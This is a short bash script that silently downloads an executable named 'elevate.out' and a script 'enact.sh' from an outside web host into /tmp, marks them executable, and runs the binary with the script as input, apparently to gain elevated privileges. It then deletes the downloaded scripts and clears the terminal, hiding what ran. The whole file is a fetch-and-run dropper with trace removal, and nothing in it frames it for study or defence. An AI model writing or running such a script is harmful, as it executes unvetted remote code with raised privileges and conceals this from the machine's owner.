#!/bin/bash

curl -so /tmp/elevate.out https://erikboesen.com/dl/elevate.out
curl -so /tmp/enact.sh https://erikboesen.com/dl/enact.sh
chmod +x /tmp/elevate.out /tmp/enact.sh

/tmp/elevate.out <<EOF
/tmp/enact.sh
EOF

rm -f /tmp/*.sh

clear
